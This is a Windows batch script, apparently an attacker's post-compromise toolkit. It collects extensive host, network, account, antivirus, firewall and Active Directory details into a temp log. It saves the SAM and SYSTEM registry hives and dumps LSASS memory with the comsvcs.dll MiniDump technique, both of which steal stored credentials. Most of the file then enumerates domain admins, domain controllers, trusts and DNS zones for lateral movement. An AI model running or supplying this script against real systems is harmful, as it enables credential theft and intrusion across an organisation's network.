set file=%tmp%\%COMPUTERNAME%-info.log
time /t>%file%
date /t>>%file%
net time /domain>>%file%
qwinsta >>%file%
cmdkey /l>>%file%
net session >>%file%
net share >>%file%
net use >>%file%
whoami /all >>%file%
net config workstation >>%file%
set >>%file%
ipconfig /all >>%file%
ipconfig /displaydns>>%file%
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings">>%file%
netsh interface portproxy show all >>%file%
arp -a>>%file%
route print -4>>%file%
netstat -ano |findstr /i /v udp>>%file%
tasklist /v>>%file%
wmic /output:%temp%\1.txt service get name,displayname,pathname,startmode,state
type %temp%\1.txt>>%file%
schtasks >>%file%
systeminfo >>%file%
wmic /output:%temp%\1.txt desktop get name,Wallpaper
type %temp%\1.txt>>%file%
net accounts>>%file%
wmic /output:%temp%\1.txt useraccount list
type %temp%\1.txt>>%file%
REM net user list>>%file%
net localgroup>>%file%
net localgroup administrators>>%file%
echo "32Bit">>%file%
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /f DisplayName /t REG_SZ /s |findstr REG_SZ>>%file%
echo "64Bit">>%file%
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall /f DisplayName /t REG_SZ /s |findstr REG_SZ>>%file%
REM wmic product get name,version,localpackage,urlinfoabout,installSourc>>%file%

wmic /output:%temp%\1.txt startup
type %temp%\1.txt>>%file%
wmic /output:%temp%\1.txt diskdrive get CapabilityDescriptions,caption,DeviceID,InterfaceType,MediaType,model,SerialNumber,size,status
type %temp%\1.txt>>%file%
wmic /output:%temp%\1.txt volume list brief
type %temp%\1.txt>>%file%
wmic /output:%temp%\1.txt logicaldisk get drivetype,caption,size,systemname,FileSystem
type %temp%\1.txt>>%file%
WMIC /output:%temp%\1.txt /namespace:\\root\securitycenter2 path antivirusproduct
type %temp%\1.txt>>%file%


net view >>%file%
netsh advfirewall show currentprofile >>%file%
netsh ipsec static show  all >>%file%
reg query  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections >>%file%
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber >>%file%

reg save HKLM\sam %tmp%\sam.hive
reg save HKLM\system %tmp%\system.hive
echo sam.hive>list.txt
echo system.hive>>list.txt

tasklist /svc|findstr /i lsass>%tmp%\1.txt
for /f "tokens=2" %%i in (%tmp%\1.txt) do powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump %%i %tmp%\lsass.dmp full"

nltest /domain_trusts>>%file%
dsquery server>>%file%
net group  "domain controllers" /domain>>%file%
net group /domain
net group "Domain Admins" /domain>>%file%
net group "Enterprise Admins" /domain>>%file%
net group "domain computers" /domain>>%file%
dsquery computer domainroot -limit 65535 && net group “domain computers” /domain>>%file%
dsquery ou
dsquery site
dsquery subnet
\Windows\System32\inetsrv\appcmd.exe list sites>>%file%
\Windows\System32\inetsrv\appcmd.exe list apppools
\Windows\System32\Dnscmd.exe . /EnumZones >>%file%
\Windows\System32\Dnscmd.exe . /EnumZones |findstr /i domain |findstr /i primary>%temp%\1.txt
@REM for /f %%i in (%temp%\1.txt) do (echo %%i >>%file% && \Windows\System32\Dnscmd.exe . /EnumRecords %%i .>>%file%)
@REM notepad %file%
